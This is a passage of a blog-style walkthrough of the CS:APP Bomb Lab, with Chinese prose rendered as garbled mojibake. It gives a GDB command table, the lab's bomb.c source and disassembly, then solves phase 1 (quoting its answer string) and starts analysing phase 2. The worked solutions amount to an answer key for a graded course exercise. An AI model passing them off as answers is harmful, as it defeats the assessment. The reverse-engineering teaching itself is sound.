    <content type="html"><![CDATA[<h1 id="BombLab"><a href="#BombLab" class="headerlink" title="BombLab"></a>BombLab</h1><p><strong>Labæ¦‚è¿°</strong>ï¼šâ€œäºŒè¿›åˆ¶ç‚¸å¼¹â€æ˜¯ä¸€ä¸ª Linux å¯æ‰§è¡Œçš„ C ç¨‹åºï¼ŒåŒ…å«å…­ä¸ªâ€œé˜¶æ®µâ€ã€‚æ¯ä¸ªé˜¶æ®µæœŸæœ›å­¦ç”Ÿåœ¨æ ‡å‡†è¾“å…¥ä¸Šè¾“å…¥ç‰¹å®šå­—ç¬¦ä¸²ã€‚å¦‚æœå­¦ç”Ÿè¾“å…¥äº†é¢„æœŸçš„å­—ç¬¦ä¸²ï¼Œåˆ™è¯¥é˜¶æ®µè¢«â€œæ‹†é™¤â€ã€‚å¦åˆ™ç‚¸å¼¹ä¼šé€šè¿‡æ‰“å°â€œBOOM!!!â€æ¥â€œçˆ†ç‚¸â€ã€‚å­¦ç”Ÿçš„ç›®æ ‡æ˜¯å°½å¯èƒ½å¤šåœ°â€œæ‹†é™¤â€è¯¥ç‚¸å¼¹ã€‚</p><p>å› æ­¤ï¼Œæœ¬Labèšç„¦äºåˆ©ç”¨gdbç­‰è°ƒè¯•å™¨æ¥åç¼–è¯‘äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œå¹¶é€æ­¥æ‰§è¡Œæ¯ä¸ªé˜¶æ®µçš„æœºå™¨ä»£ç ï¼Œåˆ©ç”¨å­¦ä¹ çš„æ±‡ç¼–çŸ¥è¯†æ¥æ‹†è§£éšè—åœ¨ä»£ç ä¸­çš„å­—ç¬¦ä¸²å¯†ç ã€‚</p><h2 id="é¢„å¤‡çŸ¥è¯†ï¼šGDBè°ƒè¯•å™¨çš„ä½¿ç”¨"><a href="#é¢„å¤‡çŸ¥è¯†ï¼šGDBè°ƒè¯•å™¨çš„ä½¿ç”¨" class="headerlink" title="é¢„å¤‡çŸ¥è¯†ï¼šGDBè°ƒè¯•å™¨çš„ä½¿ç”¨"></a>é¢„å¤‡çŸ¥è¯†ï¼šGDBè°ƒè¯•å™¨çš„ä½¿ç”¨</h2><p>GNUçš„è°ƒè¯•å™¨GDBæä¾›äº†è®¸å¤šæœ‰ç”¨çš„ç‰¹æ€§ï¼Œæ”¯æŒæœºå™¨åŠç¨‹åºçš„è¿è¡Œæ—¶è¯„ä¼°å’Œåˆ†æã€‚æˆ‘ä»¬ä½¿ç”¨ä¸‹é¢æŒ‡ä»¤è¡¨ä¸­çš„å‘½ä»¤æ¥ä½¿ç”¨GDBï¼š</p><table><thead><tr><th>å‘½ä»¤</th><th>æ•ˆæœ</th></tr></thead><tbody><tr><td>gdb fileName</td><td>å¼€å§‹è°ƒè¯•fileNameæ–‡ä»¶</td></tr><tr><td>run 1 2 3</td><td>è¿è¡Œç¨‹åºï¼ˆåœ¨æ­¤ç»™å‡ºå‘½ä»¤è¡Œå‚æ•°ï¼‰</td></tr><tr><td>kill</td><td>ç»ˆæ­¢ç¨‹åº</td></tr><tr><td>quit</td><td>é€€å‡ºGDB</td></tr><tr><td>break func</td><td>åœ¨å‡½æ•°funcå…¥å£å¤„è®¾ç½®æ–­ç‚¹</td></tr><tr><td>break * 0x10000</td><td>åœ¨åœ°å€ 0x10000 å¤„è®¾ç½®æ–­ç‚¹</td></tr><tr><td>delete 1</td><td>åˆ é™¤æ–­ç‚¹1ï¼Œæ— indexé»˜è®¤åˆ é™¤æ‰€æœ‰</td></tr><tr><td>stepi</td><td>æ‰§è¡Œ1æ¡æŒ‡ä»¤ï¼ˆåè·Ÿæ•°å­—è¡¨ç¤ºè¿è¡Œå‡ æ¡æŒ‡ä»¤ï¼‰</td></tr><tr><td>nexti</td><td>ç±»ä¼¼äºstepiï¼Œä»¥å‡½æ•°ä¸ºè°ƒç”¨å•ä½</td></tr><tr><td>continue</td><td>ç»§ç»­æ‰§è¡Œ</td></tr><tr><td>disas</td><td>åæ±‡ç¼–å½“å‰å‡½æ•°</td></tr><tr><td>disas func</td><td>åæ±‡ç¼–å‡½æ•°func</td></tr><tr><td>disas 0x10000</td><td>åæ±‡ç¼–åœ°å€0x10000é™„è¿‘çš„å‡½æ•°</td></tr><tr><td>disas 0x10000 0x100FF</td><td>åæ±‡ç¼–åœ°å€èŒƒå›´å†…çš„ä»£ç </td></tr><tr><td>print &#x2F;x $rip</td><td>ä»¥åå…­è¿›åˆ¶è¾“å‡ºç¨‹åºè®¡æ•°å™¨çš„å€¼</td></tr><tr><td>print $rax</td><td>ä»¥åè¿›åˆ¶è¾“å‡º%raxçš„å†…å®¹</td></tr><tr><td>print &#x2F;x $rip</td><td>ä»¥åå…­è¿›åˆ¶è¾“å‡º%raxçš„å†…å®¹</td></tr><tr><td>print &#x2F;t $rax</td><td>ä»¥äºŒè¿›åˆ¶è¾“å‡º%raxçš„å†…å®¹</td></tr><tr><td>print &#x2F;x 555</td><td>è¾“å‡º555çš„åå…­è¿›åˆ¶è¡¨ç¤º</td></tr><tr><td>print &#x2F;x ($rsp+8)</td><td>ä»¥åå…­è¿›åˆ¶è¾“å‡º%rspçš„å†…å®¹åŠ 8</td></tr><tr><td>print *(int *) 0x10000</td><td>å°†0x10000åœ°å€æ‰€å­˜å‚¨çš„å†…å®¹ä»¥æ•°å­—å½¢å¼è¾“å‡º</td></tr><tr><td>print (char *) 0x10000</td><td>è¾“å‡ºå­˜å‚¨åœ¨0x10000çš„å­—ç¬¦ä¸²</td></tr><tr><td>x&#x2F; $rsp</td><td>è§£æ%rspä¸­çš„å†…å®¹</td></tr><tr><td>x&#x2F;w $rsp</td><td>è§£æåœ¨%rspæ‰€æŒ‡ä½ç½®çš„wordï¼ˆ8å­—èŠ‚ï¼‰</td></tr><tr><td>info registers</td><td>å¯„å­˜å™¨ä¿¡æ¯</td></tr><tr><td>info stack</td><td>æ ˆä¿¡æ¯</td></tr><tr><td>info functions</td><td>å‡½æ•°ä¿¡æ¯</td></tr></tbody></table><p>æ›´å¤šæŒ‡ä»¤å¯ä»¥æŸ¥è¯¢æ–‡æ¡£æˆ–ä½¿ç”¨&#x2F;helpæŒ‡ä»¤ã€‚</p><h2 id="æ­£å¼é˜¶æ®µï¼šå¼€å§‹æ‹†å¼¹"><a href="#æ­£å¼é˜¶æ®µï¼šå¼€å§‹æ‹†å¼¹" class="headerlink" title="æ­£å¼é˜¶æ®µï¼šå¼€å§‹æ‹†å¼¹"></a>æ­£å¼é˜¶æ®µï¼šå¼€å§‹æ‹†å¼¹</h2><h3 id="åŸç æ€»è§ˆ"><a href="#åŸç æ€»è§ˆ" class="headerlink" title="åŸç æ€»è§ˆ"></a>åŸç æ€»è§ˆ</h3><p>æŠ›å»è¥é€ æ°›å›´æ„Ÿå’ŒèƒŒæ™¯æ•…äº‹çš„â€œDoctor Evilâ€çš„æ³¨é‡Šï¼Œæ•´ä¸ªbomb.cæ–‡ä»¶çš„ç»“æ„å¦‚ä¸‹æ‰€ç¤ºï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;support.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;phases.h&quot;</span></span><br><br>FILE *infile;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> *argv[])</span><br>&#123;<br>    <span class="hljs-type">char</span> *input;<br><br>    <span class="hljs-keyword">if</span> (argc == <span class="hljs-number">1</span>) &#123;  <br>infile = <span class="hljs-built_in">stdin</span>;<br>    &#125; <br><br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (argc == <span class="hljs-number">2</span>) &#123;<br><span class="hljs-keyword">if</span> (!(infile = fopen(argv[<span class="hljs-number">1</span>], <span class="hljs-string">&quot;r&quot;</span>))) &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s: Error: Couldn&#x27;t open %s\n&quot;</span>, argv[<span class="hljs-number">0</span>], argv[<span class="hljs-number">1</span>]);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">8</span>);<br>&#125;<br>    &#125;<br><br>    <span class="hljs-comment">/* You can&#x27;t call the bomb with more than 1 command line argument. */</span><br>    <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Usage: %s [&lt;input_file&gt;]\n&quot;</span>, argv[<span class="hljs-number">0</span>]);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">8</span>);<br>    &#125;<br><br>    initialize_bomb();<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Welcome to my fiendish little bomb. You have 6 phases with\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;which to blow yourself up. Have a nice day!\n&quot;</span>);<br><br>    input = read_line();             <br>    phase_1(input);                  <br>    phase_defused();                 <br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Phase 1 defused. How about the next one?\n&quot;</span>);<br><br>    input = read_line();<br>    phase_2(input);<br>    phase_defused();<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;That&#x27;s number 2.  Keep going!\n&quot;</span>);<br><br><br>    input = read_line();<br>    phase_3(input);<br>    phase_defused();<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Halfway there!\n&quot;</span>);<br><br>    input = read_line();<br>    phase_4(input);<br>    phase_defused();<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;So you got that one.  Try this one.\n&quot;</span>);<br><br>    input = read_line();<br>    phase_5(input);<br>    phase_defused();<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Good work!  On to the next...\n&quot;</span>);<br><br>    input = read_line();<br>    phase_6(input);<br>    phase_defused();<br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>æ•´æ®µä»£ç çš„é€»è¾‘å¾ˆç®€å•ï¼Œé¦–å…ˆå®šä¹‰äº†ä¸€ä¸ªFileæ–‡ä»¶infileä½œä¸ºæˆ‘ä»¬è¾“å…¥å¯†ç çš„æ–‡ä»¶ï¼Œç„¶åä»£ç ä¼šä»infileä¸­è¯»å–æˆ‘ä»¬çš„å¯†ç å®Œæˆå„ä¸ªé˜¶æ®µçš„è§£å¯†ã€‚è€Œè§£å¯†æ‰€éœ€è¦çš„å­—ç¬¦å°±å‚¨å­˜åœ¨äºŒè¿›åˆ¶æ–‡ä»¶bombä¸­ã€‚</p><p>ä½¿ç”¨æŒ‡ä»¤<code>objdump -d bomb &gt; bomb.asm</code>ï¼Œæˆ‘ä»¬ä¾¿å¾—åˆ°äº†åç¼–è¯‘åçš„æ–‡ä»¶ã€‚</p><h3 id="Phase-1"><a href="#Phase-1" class="headerlink" title="Phase_1"></a>Phase_1</h3><p>é˜…è¯»æ–‡ä»¶ï¼Œæˆ‘ä»¬æ‰¾åˆ°phase_1å¯¹åº”çš„ä»£ç ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs assembly">0000000000400ee0 &lt;phase_1&gt;:<br>  400ee0:48 83 ec 08          sub    $0x8,%rsp<br>  400ee4:be 00 24 40 00       mov    $0x402400,%esi<br>  400ee9:e8 4a 04 00 00       call   401338 &lt;strings_not_equal&gt;<br>  400eee:85 c0                test   %eax,%eax<br>  400ef0:74 05                je     400ef7 &lt;phase_1+0x17&gt;<br>  400ef2:e8 43 05 00 00       call   40143a &lt;explode_bomb&gt;<br>  400ef7:48 83 c4 08          add    $0x8,%rsp<br>  400efb:c3                   ret    <br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬å‘ç°ï¼Œå…¶ä¸­åŒ…å«ä¸€ä¸ªæ£€æŸ¥å­—ç¬¦ä¸²æ˜¯å¦ç›¸ç­‰çš„çš„å‡½æ•°<code>strings_not_equal</code>ï¼Œå¦‚æœç›¸ç­‰ï¼Œåˆ™è·³è½¬åˆ°åœ°å€0x400ef7å¤„ï¼ˆaddè¡Œï¼‰ï¼Œå¦‚æœä¸ç›¸ç­‰ï¼Œåˆ™è°ƒç”¨<code>explode_bomb</code>ï¼Œä¸éš¾æƒ³è±¡ä¼šå‘ç”Ÿä»€ä¹ˆã€‚äºæ˜¯æˆ‘ä»¬é¦–å…ˆå°±æ˜¯è¦åœ¨<code>explode_bomb</code>å‡½æ•°å¤„æ‰“ä¸€ä¸ªæ–­ç‚¹ï¼Œç¡®ä¿æˆ‘ä»¬æ¥ä¸‹æ¥çš„æ“ä½œä¸ä¼šå¼•èµ·ç‚¸å¼¹çˆ†ç‚¸ã€‚</p><p>åˆ†æå„ä¸ªå¯„å­˜å™¨ï¼Œæˆ‘ä»¬å‘ç°å‡ºç°äº†%rspï¼Œ%esiï¼Œ%eaxä¸‰ä¸ªå¯„å­˜å™¨ã€‚å…¶ä¸­%rspä¸ºæ ˆæŒ‡é’ˆï¼ŒæŒ‡æ˜è¿è¡Œæ—¶æ ˆçš„æ ˆé¡¶ä½ç½®ï¼Œè€Œ%esiä¸º%rsiçš„ä½8å­—èŠ‚ï¼Œä¿å­˜å‡½æ•°è°ƒç”¨çš„ç¬¬äºŒä¸ªå‚æ•°ï¼Œ%eaxä½œä¸º%raxçš„ä½8å­—èŠ‚ï¼Œä¿å­˜å‡½æ•°çš„è¿”å›å€¼ã€‚æ‰€ä»¥æˆ‘ä»¬å°±åˆ»ç”»å‡ºäº†å‡½æ•°<code>strings_not_equal</code>çš„åŸºæœ¬å½¢å¼ï¼šæ¥å—è‡³å°‘ä¸¤ä¸ªå‚æ•°å¹¶è¿”å›ä¸€ä¸ªå€¼ã€‚ä¸éš¾æƒ³åˆ°ç¬¬ä¸€ä¸ªå‚æ•°å°±æ˜¯æˆ‘ä»¬è¾“å…¥çš„å­—ç¬¦ä¸²ï¼Œç¬¬äºŒä¸ªå‚æ•°å­˜æ”¾åœ¨åœ°å€<strong>0x402400</strong>çš„å­—ç¬¦ä¸²å°±æ˜¯æˆ‘ä»¬çš„å¯†ç ã€‚</p><p>æ¥ä¸‹æ¥æˆ‘ä»¬æ¥æ“ä½œä¸€ä¸‹ï¼Œé¦–å…ˆæ‰“æ–­ç‚¹å¹¶è¿è¡Œï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">gdb bomb<br>(gdb) <span class="hljs-built_in">break</span> explode_bomb<br>(gdb) <span class="hljs-built_in">break</span> phase_1<br>(gdb) run<br></code></pre></td></tr></table></figure><p>è¿™é‡Œä¼šè®©ä½ è¾“å…¥å¯†ç ï¼Œå¯ä»¥å…ˆéšä¾¿è¾“å…¥ä¸€ä¸ªåˆ°è¾¾æ–­ç‚¹ã€‚</p><p>ä¹‹åæˆ‘ä»¬ä¾¿åˆ°è¾¾äº†æ–­ç‚¹phase_1ï¼Œç”¨<code>disas</code>æŒ‡ä»¤çœ‹çœ‹å®ƒçš„<del>æº</del>ç ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">Breakpoint 2, 0x0000000000400ee0 <span class="hljs-keyword">in</span> phase_1 ()<br>(gdb) disas<br>Dump of assembler code <span class="hljs-keyword">for</span> <span class="hljs-keyword">function</span> phase_1:<br>=&gt; 0x0000000000400ee0 &lt;+0&gt;:     sub    <span class="hljs-variable">$0x8</span>,%rsp<br>   0x0000000000400ee4 &lt;+4&gt;:     mov    <span class="hljs-variable">$0x402400</span>,%esi<br>   0x0000000000400ee9 &lt;+9&gt;:     call   0x401338 &lt;strings_not_equal&gt;<br>   0x0000000000400eee &lt;+14&gt;:    <span class="hljs-built_in">test</span>   %eax,%eax<br>   0x0000000000400ef0 &lt;+16&gt;:    je     0x400ef7 &lt;phase_1+23&gt;<br>   0x0000000000400ef2 &lt;+18&gt;:    call   0x40143a &lt;explode_bomb&gt;<br>   0x0000000000400ef7 &lt;+23&gt;:    add    <span class="hljs-variable">$0x8</span>,%rsp<br>   0x0000000000400efb &lt;+27&gt;:    ret<br></code></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°å’Œæˆ‘ä»¬ä¸Šé¢è§£æå‡ºæ¥çš„ä»£ç ä¸€è‡´ã€‚</p><p>ç»§ç»­ä½¿ç”¨<code>stepi</code>æŒ‡ä»¤å‘ä¸‹æ‰§è¡Œåˆ°movæŒ‡ä»¤ç»“æŸï¼š</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">(gdb) stepi <span class="hljs-number">2</span><br>(gdb) disas<br>Dump of assembler code for function phase_1:<br>   <span class="hljs-number">0x0000000000400ee0</span> &lt;+<span class="hljs-number">0</span>&gt;:     <span class="hljs-keyword">sub</span>    <span class="hljs-number">$0</span>x8,%rsp<br>   <span class="hljs-number">0x0000000000400ee4</span> &lt;+<span class="hljs-number">4</span>&gt;:     <span class="hljs-keyword">mov</span>    <span class="hljs-number">$0</span>x402400,%esi<br>=&gt; <span class="hljs-number">0x0000000000400ee9</span> &lt;+<span class="hljs-number">9</span>&gt;:     <span class="hljs-keyword">call</span>   <span class="hljs-number">0x401338</span> &lt;strings_not_equal&gt;<br>   <span class="hljs-number">0x0000000000400eee</span> &lt;+<span class="hljs-number">14</span>&gt;:    <span class="hljs-keyword">test</span>   %eax,%eax<br>   <span class="hljs-number">0x0000000000400ef0</span> &lt;+<span class="hljs-number">16</span>&gt;:    <span class="hljs-keyword">je</span>     <span class="hljs-number">0x400ef7</span> &lt;phase_1+<span class="hljs-number">23</span>&gt;<br>   <span class="hljs-number">0x0000000000400ef2</span> &lt;+<span class="hljs-number">18</span>&gt;:    <span class="hljs-keyword">call</span>   <span class="hljs-number">0x40143a</span> &lt;explode_bomb&gt;<br>   <span class="hljs-number">0x0000000000400ef7</span> &lt;+<span class="hljs-number">23</span>&gt;:    <span class="hljs-keyword">add</span>    <span class="hljs-number">$0</span>x8,%rsp<br>   <span class="hljs-number">0x0000000000400efb</span> &lt;+<span class="hljs-number">27</span>&gt;:    <span class="hljs-keyword">ret</span><br>End of assembler dump.<br></code></pre></td></tr></table></figure><p>å¥½çš„ï¼Œæ­¤æ—¶åœ°å€<strong>0x402400</strong>å¤„çš„å­—ç¬¦ä¸²å·²ç»æˆåŠŸç§»åˆ°%esiå¯„å­˜å™¨ä¸­äº†ã€‚æˆ‘ä»¬ä½¿ç”¨<code>x/s $esi</code>å¯ä»¥å¾—åˆ°å†…å®¹å­—ç¬¦ä¸²ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">(gdb) x/s <span class="hljs-variable">$esi</span><br>0x402400:       <span class="hljs-string">&quot;Border relations with Canada have never been better.&quot;</span><br></code></pre></td></tr></table></figure><p>è¿™ä¾¿æ˜¯æˆ‘ä»¬ç¬¬ä¸€é˜¶æ®µçš„å¯†é’¥ã€‚</p><p>ç”±äºè¿™é‡Œæˆ‘ä»¬å·²ç»å¾—åˆ°äº†å­—ç¬¦ä¸²å­˜æ”¾çš„æºåœ°å€ï¼Œæ›´ç®€å•çš„æ–¹æ³•æ˜¯ç›´æ¥è§£æå¯¹åº”åœ°å€ï¼Œä¸éœ€è¦åˆ©ç”¨å¯„å­˜å™¨ã€‚ä½†ç”±äºå®é™…ä¸Šæ¯æ¬¡è¿è¡Œä»£ç çš„åœ°å€æ˜¯ä¸ç¡®å®šçš„ï¼Œä¸€èˆ¬ä¹Ÿä¸ä¼šç›´æ¥å‘ŠçŸ¥åœ°å€ï¼Œæ‰€ä»¥æˆ‘é‡‡å–äº†ä¸€ç§è¿‚å›çš„æ–¹æ³•ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">(gdb) <span class="hljs-built_in">print</span> (char*) 0x402400<br><span class="hljs-variable">$1</span> = 0x402400 <span class="hljs-string">&quot;Border relations with Canada have never been better.&quot;</span><br></code></pre></td></tr></table></figure><p>è¿™æ ·ä¹Ÿè¡Œã€‚</p><h3 id="Phase-2"><a href="#Phase-2" class="headerlink" title="Phase_2"></a>Phase_2</h3><p>æˆ‘ä»¬é¦–å…ˆæ£€éªŒphase_1çš„å¯†ç æ˜¯å¦æ­£ç¡®ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">(gdb) <span class="hljs-built_in">break</span> phase_2<br>Breakpoint 1 at 0x400efc<br>(gdb) <span class="hljs-built_in">break</span> explode_bomb<br>Breakpoint 2 at 0x40143a<br>(gdb) run<br>Welcome to my fiendish little bomb. You have 6 phases with<br><span class="hljs-built_in">which</span> to blow yourself up. Have a <span class="hljs-built_in">nice</span> day!<br>Border relations with Canada have never been better.<br>Phase 1 defused. How about the next one?<br>aaa<br><br>Breakpoint 1, 0x0000000000400efc <span class="hljs-keyword">in</span> phase_2 ()<br></code></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°ï¼Œæ–­ç‚¹æˆåŠŸåœåœ¨äº†phase_2å¤„ï¼Œè¯´æ˜æˆ‘ä»¬æˆåŠŸé€šè¿‡é˜¶æ®µ1.æ¥ä¸‹æ¥æŠŠphase_2çš„ä»£ç åæ±‡ç¼–å‡ºæ¥ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs bash">(gdb) disas<br>Dump of assembler code <span class="hljs-keyword">for</span> <span class="hljs-keyword">function</span> phase_2:<br>=&gt; 0x0000000000400efc &lt;+0&gt;:     push   %rbp<br>   0x0000000000400efd &lt;+1&gt;:     push   %rbx<br>   0x0000000000400efe &lt;+2&gt;:     sub    <span class="hljs-variable">$0x28</span>,%rsp<br>   0x0000000000400f02 &lt;+6&gt;:     mov    %rsp,%rsi<br>   0x0000000000400f05 &lt;+9&gt;:     call   0x40145c &lt;read_six_numbers&gt;<br>   0x0000000000400f0a &lt;+14&gt;:    cmpl   <span class="hljs-variable">$0x1</span>,(%rsp)<br>   0x0000000000400f0e &lt;+18&gt;:    je     0x400f30 &lt;phase_2+52&gt;<br>   0x0000000000400f10 &lt;+20&gt;:    call   0x40143a &lt;explode_bomb&gt;<br>   0x0000000000400f15 &lt;+25&gt;:    jmp    0x400f30 &lt;phase_2+52&gt;<br>   0x0000000000400f17 &lt;+27&gt;:    mov    -0x4(%rbx),%eax<br>   0x0000000000400f1a &lt;+30&gt;:    add    %eax,%eax<br>   0x0000000000400f1c &lt;+32&gt;:    cmp    %eax,(%rbx)<br>   0x0000000000400f1e &lt;+34&gt;:    je     0x400f25 &lt;phase_2+41&gt;<br>   0x0000000000400f20 &lt;+36&gt;:    call   0x40143a &lt;explode_bomb&gt;<br>   0x0000000000400f25 &lt;+41&gt;:    add    <span class="hljs-variable">$0x4</span>,%rbx<br>   0x0000000000400f29 &lt;+45&gt;:    cmp    %rbp,%rbx<br>   0x0000000000400f2c &lt;+48&gt;:    jne    0x400f17 &lt;phase_2+27&gt;<br>   0x0000000000400f2e &lt;+50&gt;:    jmp    0x400f3c &lt;phase_2+64&gt;<br>   0x0000000000400f30 &lt;+52&gt;:    lea    0x4(%rsp),%rbx<br>   0x0000000000400f35 &lt;+57&gt;:    lea    0x18(%rsp),%rbp<br>   0x0000000000400f3a &lt;+62&gt;:    jmp    0x400f17 &lt;phase_2+27&gt;<br>   0x0000000000400f3c &lt;+64&gt;:    add    <span class="hljs-variable">$0x28</span>,%rsp<br>   0x0000000000400f40 &lt;+68&gt;:    pop    %rbx<br>   0x0000000000400f41 &lt;+69&gt;:    pop    %rbp<br>   0x0000000000400f42 &lt;+70&gt;:    ret<br>End of assembler dump.<br></code></pre></td></tr></table></figure><p>å¯ä»¥å‘ç°å†…éƒ¨çš„ä¸»ä½“å­˜åœ¨å‡½æ•°<code>read_six_numbers</code>ä»¥åŠå¼•çˆ†ç¨‹åº<code>explode_bomb</code>ã€‚ä¸éš¾çŒœå‡ºå‡½æ•°<code>read_six_numbers</code>ä¾¿æ˜¯æ£€éªŒæˆ‘ä»¬ç­”æ¡ˆçš„å‡½æ•°ï¼Œç­”æ¡ˆåŒ…æ‹¬6ä¸ªæ•°å­—ã€‚</p><p>æ¥é€æ­¥åˆ†æè¿™æ®µä»£ç çš„é€»è¾‘ï¼š</p><ol><li>å°†%rbpå’Œ%rbxå‹å…¥æ ˆä¸­ï¼Œå†ç”³è¯·ä¸€ä¸ª0x28ï¼ˆ40å­—èŠ‚ï¼‰çš„ç©ºé—´</li><li>å°†æ ˆé¡¶%rspå­˜æ”¾çš„æ•°æ®è½¬ç§»åˆ°%rsiä¸­ä½œä¸ºå‡½æ•°<code>read_six_numbers</code>çš„ç¬¬äºŒä¸ªå‚æ•°ï¼Œè°ƒç”¨å‡½æ•°ã€‚</li><li>æ¯”è¾ƒï¼ˆ%rspï¼‰å’Œ1ï¼Œå¦‚æœä¸ç›¸ç­‰ï¼Œç‚¸å¼¹çˆ†ç‚¸ã€‚</li><li>å¦‚æœç›¸ç­‰ï¼Œè·³è½¬åˆ°0x400f30è¡Œï¼ˆ+52  leaè¡Œï¼‰ï¼Œè¿™è¡Œå°†%rsp+0x4çš„å€¼å­˜å…¥%rbxä¸­ï¼Œä¹‹åå°†%rsp+0x18çš„å€¼å­˜å…¥%rbpã€‚</li><li>å†è·³è½¬åˆ°0x400f17ï¼ˆ+27  movè¡Œï¼‰ï¼Œå°†%rbx-0x4çš„å€¼å­˜å…¥%eaxï¼Œå†å°†%eaxä¸­çš„å€¼ç¿»å€ã€‚ä¹‹åæ¯”è¾ƒï¼ˆ%rbxï¼‰ï¼ˆè¿™æ˜¯ä¸ªé—´æ¥å–å€ï¼‰å’Œ%eaxçš„å€¼ï¼Œå¦‚æœä¸ç­‰ï¼Œç‚¸å¼¹çˆ†ç‚¸ã€‚</li><li>å¦‚æœç›¸ç­‰ï¼Œè·³è½¬åˆ°0x400f25è¡Œï¼ˆ+41  